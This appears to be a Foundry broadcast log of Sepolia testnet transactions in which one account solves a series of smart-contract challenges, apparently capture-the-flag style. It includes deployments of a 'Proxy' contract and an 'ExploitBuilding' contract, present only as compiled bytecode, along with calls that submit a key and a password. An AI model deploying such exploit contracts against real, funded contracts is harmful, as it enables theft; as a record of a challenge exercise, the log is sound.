{
  "transactions": [
    {
      "hash": "0x52f9aa3676cae49153ec8959e7976c434ffa9e83600873c2cf550b84b0d2b5b4",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "flip(bool)",
      "arguments": [
        "false"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x11efc",
        "value": "0x0",
        "input": "0x1d263f670000000000000000000000000000000000000000000000000000000000000000",
        "nonce": "0x1b",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xbca02447d4e6ef161d492cc73539d7b7cac8434cd766bfb51ee50d510b541d79",
      "transactionType": "CREATE",
      "contractName": "Proxy",
      "contractAddress": "0xdc116b97ceeb178045e763b408e53bebf6d089cc",
      "function": null,
      "arguments": [
        "0x9D29D33d4329640e96cC259E141838EB3EB2f1d9"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "gas": "0x25e68",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b506040516101283803806101288339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031990921691909117905560c4806100646000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80639dfbccfe14602d575b600080fd5b60336035565b005b60008054604080516335f9cd5560e11b815290516001600160a01b0390921692636bf39aaa9260048084019382900301818387803b158015607557600080fd5b505af11580156088573d6000803e3d6000fd5b5050505056fea26469706673582212207ff1811f4e660d63eda769435319577a8a39dbc3274c5726fa16ea16d545d78364736f6c634300070000330000000000000000000000009d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "nonce": "0x1c",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xc0d6fe4b5c56195207540afce9b794100b2c54b52930f0af963e14760c5d0e2c",
      "transactionType": "CALL",
      "contractName": "Proxy",
      "contractAddress": "0xdc116b97ceeb178045e763b408e53bebf6d089cc",
      "function": "addpoint()",
      "arguments": [],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0xdc116b97ceeb178045e763b408e53bebf6d089cc",
        "gas": "0xb05f",
        "value": "0x0",
        "input": "0x9dfbccfe",
        "nonce": "0x1d",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x16ec5a50aa19d7bff050f25e3d08a2a751b7f576ef4a715affc01fa166522f30",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x0000000000000000000000000000000000000000",
        "123"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0xc4d0",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007b",
        "nonce": "0x1e",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x82a3196d7fd09ac488aaff89ca76833b58074dfc655f34569157659d0991086c",
      "transactionType": "CREATE",
      "contractName": "ExploitBuilding",
      "contractAddress": "0x2f2afdaf8fc7439857248a7a122850df5b2fa398",
      "function": null,
      "arguments": [
        "0x9D29D33d4329640e96cC259E141838EB3EB2f1d9"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "gas": "0x3627b",
        "value": "0x0",
        "input": "0x60806040526000805460ff60a01b1916905534801561001d57600080fd5b506040516102223803806102228339818101604052602081101561004057600080fd5b5051600080546001600160a01b039092166001600160a01b03199092169190911790556101b0806100726000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806335f738a7146100515780635f9a4bca1461006d57806399cb4fbc1461008a578063f95c9b1b146100ae575b600080fd5b6100596100b8565b604080519115158252519081900360200190f35b6100596004803603602081101561008357600080fd5b50356100c8565b610092610109565b604080516001600160a01b039092168252519081900360200190f35b6100b6610118565b005b600054600160a01b900460ff1681565b60008054600160a01b900460ff166100f357506000805460ff60a01b1916600160a01b178155610104565b506000805460ff60a01b1916905560015b919050565b6000546001600160a01b031681565b6000805460408051633b669c4d60e21b81526001600482015290516001600160a01b039092169263ed9a71349260248084019382900301818387803b15801561016057600080fd5b505af1158015610174573d6000803e3d6000fd5b5050505056fea264697066735822122094161002be9113b574ae909bcb62f8f70907b0483412aadef9494564490bbfd764736f6c634300070000330000000000000000000000009d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "nonce": "0x1f",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x5219170244ae0a4c93c9a9c8367526e0814d1c0a81add3db30739640ad690267",
      "transactionType": "CALL",
      "contractName": "ExploitBuilding",
      "contractAddress": "0x2f2afdaf8fc7439857248a7a122850df5b2fa398",
      "function": "exploitGoTo()",
      "arguments": [],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x2f2afdaf8fc7439857248a7a122850df5b2fa398",
        "gas": "0x22afd",
        "value": "0x0",
        "input": "0xf95c9b1b",
        "nonce": "0x20",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xb378e29455eef1fc6697488831c613b90982a390efd4cd50f420561e861c2c01",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "sendKey(bytes16)",
      "arguments": [
        "0x4cded594c37730434fcf53dd25e29ab500000000000000000000000000000000"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x12186",
        "value": "0x0",
        "input": "0x9d3ad91a4cded594c37730434fcf53dd25e29ab500000000000000000000000000000000",
        "nonce": "0x21",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x0c02eaa5b64602ad8eb21053ae5fc5fb0d8f85748db2dc93c352058fccbe94be",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "sendPassword(bytes32)",
      "arguments": [
        "0xde241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8"
      ],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x1220d",
        "value": "0x0",
        "input": "0x5c8d2c38de241fe7f783f2ed343248c0762dade0cf4eea6ed49dfe2f9f1267483c9eade8",
        "nonce": "0x22",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xb81ddfedf93a17d7ec063815dd31bb4bd0e2fd92d5cea15f75792a54bd028488",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": "contribute()",
      "arguments": [],
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0xbb37",
        "value": "0x3328b944c4000",
        "input": "0xd7bb99ba",
        "nonce": "0x23",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xea0d043735a35b01902e0b5c479a5792b443dcf3a49de218e6654dc1ba9fff27",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
        "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
        "gas": "0x958a",
        "value": "0x38d7ea4c68000",
        "input": "0x",
        "nonce": "0x24",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x1534eef",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0x52f9aa3676cae49153ec8959e7976c434ffa9e83600873c2cf550b84b0d2b5b4",
      "transactionIndex": "0xa1",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0xcfc6",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x155217d",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xbca02447d4e6ef161d492cc73539d7b7cac8434cd766bfb51ee50d510b541d79",
      "transactionIndex": "0xa2",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x1d28e",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": null,
      "contractAddress": "0xdc116b97ceeb178045e763b408e53bebf6d089cc"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x15d95af",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xc0d6fe4b5c56195207540afce9b794100b2c54b52930f0af963e14760c5d0e2c",
      "transactionIndex": "0xac",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x7899",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0xdc116b97ceeb178045e763b408e53bebf6d089cc",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x15e242d",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0x16ec5a50aa19d7bff050f25e3d08a2a751b7f576ef4a715affc01fa166522f30",
      "transactionIndex": "0xad",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x8e7e",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x160bed9",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0x82a3196d7fd09ac488aaff89ca76833b58074dfc655f34569157659d0991086c",
      "transactionIndex": "0xae",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x29aac",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": null,
      "contractAddress": "0x2f2afdaf8fc7439857248a7a122850df5b2fa398"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x16250a7",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0x5219170244ae0a4c93c9a9c8367526e0814d1c0a81add3db30739640ad690267",
      "transactionIndex": "0xaf",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x191ce",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x2f2afdaf8fc7439857248a7a122850df5b2fa398",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x16957bb",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xb378e29455eef1fc6697488831c613b90982a390efd4cd50f420561e861c2c01",
      "transactionIndex": "0xb7",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0xd19d",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x16a29ba",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0x0c02eaa5b64602ad8eb21053ae5fc5fb0d8f85748db2dc93c352058fccbe94be",
      "transactionIndex": "0xb8",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0xd1ff",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x16aa9bd",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xb81ddfedf93a17d7ec063815dd31bb4bd0e2fd92d5cea15f75792a54bd028488",
      "transactionIndex": "0xb9",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x8003",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x16b1601",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x0",
      "transactionHash": "0xea0d043735a35b01902e0b5c479a5792b443dcf3a49de218e6654dc1ba9fff27",
      "transactionIndex": "0xba",
      "blockHash": "0x9a3cbb7c13217b010a599c74f25e65e2bf45aabfaa4a3a5e8111d8f5856b0764",
      "blockNumber": "0x60fb97",
      "gasUsed": "0x6c44",
      "effectiveGasPrice": "0x6020d79c6",
      "from": "0x94e2057d263758630426bbcf1f801bee5bb52de4",
      "to": "0x9d29d33d4329640e96cc259e141838eb3eb2f1d9",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1721647442,
  "chain": 11155111,
  "commit": "d8d8f58"
}